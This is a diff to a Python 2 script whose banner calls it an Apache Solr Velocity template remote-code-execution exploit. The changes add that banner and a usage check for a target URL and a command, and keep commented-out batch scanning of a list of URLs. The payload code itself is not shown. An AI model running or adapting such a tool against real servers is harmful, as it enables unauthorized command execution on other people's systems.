@@ -4,6 +4,29 @@ import requests
 import sys
 import json
 
+banner = '''
+
+
+                            _             _____       _        _____   _____ ______ 
+     /\                    | |           / ____|     | |      |  __ \ / ____|  ____|
+    /  \   _ __   __ _  ___| |__   ___  | (___   ___ | |_ __  | |__) | |    | |__   
+   / /\ \ | '_ \ / _` |/ __| '_ \ / _ \  \___ \ / _ \| | '__| |  _  /| |    |  __|  
+  / ____ \| |_) | (_| | (__| | | |  __/  ____) | (_) | | |    | | \ \| |____| |____ 
+ /_/    \_\ .__/ \__,_|\___|_| |_|\___| |_____/ \___/|_|_|    |_|  \_\\_____|______|
+          | |                                                                       
+          |_|                                                                       
+
+                   Apache Solr Velocity模板远程代码执行
+
+                         2019-10-30  17:30
+
+                         python By Jas502n
+
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+'''
+print banner
 
 def get_code_name(url):
     if url[-1] == '/':
@@ -69,16 +92,18 @@ def send_exp(exp_url,cmd):
     else:
         print "[+] EXP No Send Successful!\n"
 if __name__ == '__main__':
-    print("\n[+] python %s http://x.x.x.x:8983  command\n" % sys.argv[0])
-    # url = "http://192.168.5.86:8983"
-    url = sys.argv[1]
-    get_code_name(url)
-
-    # 批量
-    # f = open('url.txt','rb')
-    # for i in f.readlines():
-    #     url = i.split('\r\n')[0]
-    #     get_code_name(url)
+    if len(sys.argv) != 3:
+        sys.exit("\n [+] Usage:  python %s http://x.x.x.x:8983  command\n" % sys.argv[0])
+    else:
+        # url = "http://192.168.5.86:8983"
+        url = sys.argv[1]
+        get_code_name(url)
+    
+        # 批量
+        # f = open('url.txt','rb')
+        # for i in f.readlines():
+        #     url = i.split('\r\n')[0]
+        #     get_code_name(url)
 
     
     
